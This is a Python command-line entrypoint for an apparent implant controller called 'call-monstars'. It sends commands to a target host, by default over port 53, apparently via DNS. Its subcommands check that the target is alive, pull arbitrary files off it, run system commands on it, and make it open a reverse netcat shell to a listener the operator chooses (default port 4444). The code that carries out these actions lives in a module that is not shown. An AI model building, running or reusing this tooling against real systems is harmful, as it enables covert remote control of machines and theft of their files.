"""CLI entrypoint"""
import argparse
import ipaddress
import pathlib

from .commands import cmd_exec, cmd_get, cmd_ping, cmd_shell

DEFAULT_DEST_PORT = 53
DEFAULT_LISTEN_PORT = 8080
DEFAULT_SHELL_PORT = 4444


def do_ping(dest_ip, dest_port, listen_port, **kwargs):
    if cmd_ping(dest_ip=dest_ip, dest_port=dest_port, listen_port=listen_port):
        print(f'Received PONG from {dest_ip}')
    

def do_get(dest_ip, dest_port, listen_port, path, output_path, **kwargs):
    file_data = cmd_get(dest_ip=dest_ip, dest_port=dest_port, listen_port=listen_port, path=path)
    if output_path is None:
        output_path = path.name
    elif output_path.is_dir():
        output_path = output_path.resolve() / path.name
    with output_path.resolve().open("wb") as f:
        f.write(file_data)


def do_exec(dest_ip, dest_port, listen_port, cmd, **kwargs):
    errno, stdout = cmd_exec(dest_ip=dest_ip, dest_port=dest_port, listen_port=listen_port, cmd=cmd)
    print(f"\nCommand returned: {errno}")
    print(f"\nCommand output:\n***************\n{stdout}")


def do_shell(dest_ip, dest_port, listen_port, shell, **kwargs):
    # sanity check on host:IP string
    assert len(shell.split(":")) == 2
    assert int(shell.split(":")[1]) > 0
    if cmd_shell(
        dest_ip=dest_ip,
        dest_port=dest_port,
        listen_port=listen_port,
        shell_ip=ipaddress.IPv4Address(shell.split(":", 1)[0]),
        shell_port=shell.rsplit(":", 1)[1],
    ):
        print(f"Connected reverse shell to {shell}")


def main():
    """CLI entrypoint"""
    parser = argparse.ArgumentParser(description="send it!")
    subparsers = parser.add_subparsers(help='(run "call-monstars [command] -h" for command-specific options)')
    parser.add_argument(
        "-i", "--dest-ip",
        type=ipaddress.IPv4Address,
        required=True,
        help="IP address of host machine",
    )
    parser.add_argument(
        "-d", "--dest-port",
        type=int,
        default=DEFAULT_DEST_PORT,
        help="destination port number",
    )
    parser.add_argument(
        "-l", "--listen-port",
        type=int,
        default=DEFAULT_LISTEN_PORT,
        help="TCP port to listen on for a response"
    )
    # ping
    ping_parser = subparsers.add_parser("ping", help="ping a target")
    ping_parser.set_defaults(func=do_ping)
    # get
    get_parser = subparsers.add_parser("get", help="retrieve a file")
    get_parser.add_argument(
        "path",
        type=pathlib.PurePosixPath,
        help="file to retrieve",
    )
    get_parser.add_argument(
        "-o", "--output-path",
        type=pathlib.Path,
        required=False,
        help="local path for retrieved file",
    )
    get_parser.set_defaults(func=do_get)
    # exec
    exec_parser = subparsers.add_parser("exec", help="run a system command")
    exec_parser.add_argument(
        "cmd",
        help="command to run",
    )
    exec_parser.set_defaults(func=do_exec)
    # shell
    shell_parser = subparsers.add_parser("shell", help="start a reverse netcat shell")
    shell_parser.add_argument(
        "shell",
        help="host listening for the TCP reverse shell (IP:port)",
    )
    shell_parser.set_defaults(func=do_shell)
    # run with it
    args = parser.parse_args()
    args.func(**vars(args))


if __name__ == "__main__":
    main()